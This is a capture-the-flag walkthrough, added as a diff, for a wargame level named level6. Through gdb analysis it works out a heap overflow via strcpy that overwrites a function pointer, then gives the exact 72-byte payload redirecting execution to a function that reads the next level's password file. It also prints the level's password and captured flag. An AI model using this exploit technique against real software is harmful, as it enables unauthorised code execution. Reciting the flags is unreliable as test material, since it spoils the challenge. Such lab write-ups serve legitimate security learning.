@@ -1,0 +1,93 @@
+login : pw
+	level6 : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+disas main
+	=> stack allocated = 0x20
+	=> call malloc with 0x40 = 64
+		=> stores ret value in esp+0x1c
+	=> call malloc with 0x4
+		=> stores ret value in esp+0x18
+			=> assigns *(esp+0x18) to 0x8048468
+				x/x 0x8048468
+					=> 0x8048468 <m>:	0x83e58955
+	=> call strcpy
+		=> esp+0x4 <= edx <= eax <= *eax <= eax+4 <= *(ebp+0xc)
+			=> *(ebp+0xc) = argv
+			=> (*(ebp+0xc))+0x4 = argv + 1
+			=> *((*(ebp+0xc))+0x4) = argv[1]
+				=> second param in strcpy is argv[1]
+		=> esp <= eax <= *(esp+0x1c) <= first malloc
+			=> first param is ret value from first malloc call
+	=> call eax
+		=> eax <= *eax <= *(esp+0x18)
+			=> *(esp+0x18) = ret value from seconc malloc call
+			=> **(esp+0x18) = actual address of m previously seen
+
+disas m
+	call puts with 0x80485d1
+		x/s 0x80485d1
+			=> Nope
+
+info func
+	=> Just to check in case (remember from level5)
+		=> 0x08048454  n
+
+disas n
+	=> call system with 0x80485b0
+		x/s 0x80485b0
+			=> 0x80485b0:	 "/bin/cat /home/user/level7/.pass"
+	=> I start thinking that I missed functions in first levels ahah
+
+n address is 0x08048454
+My second malloc call stores its value and call it
+My first malloc is 64 bytes long
+	=> it is passed to string copy which writes into it
+man strcpy
+	=> Beware of buffer overruns!
+My guess is I need to overwrite the previously assigned function pointer with n address
+
+Lets confirm:
+python -c 'print "a"*100'
+	=> copy output and launches ./level6 [output]
+		=> should segfault as we dereference 61616161
+			=> segfault 61616161
+
+Lets confirm the offset:
+	=> we could use gdb-peda
+b *main+21
+	=> Right after first malloc
+b *main+37
+	=> Right after second malloc
+
+r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+	=> breakpoint
+		=> eax contains pointer value
+	p/x $eax
+		=> 0x804a008
+
+continue
+	=> breakpoint
+		=> same
+	p/x $eax
+		=> 0x804a050
+
+p/d 0x804a050-0x804a008
+	=> 72
+
+delete
+	=> remove useless previous breakpoints
+b *main+78
+	=> Right after strcpy
+
+python -c 'print "a"*72 + "bbbb"'
+r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
+	=> should segfault with 62626262
+		=> segfault in 62626262
+
+Lets put n address instead of "bbbb"
+	n address is 0x08048454
+
+python -c 'print "a"*72 + "\x54\x84\x04\x08"' > /tmp/d
+
+cat /tmp/d | xargs ./level6
+	=> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
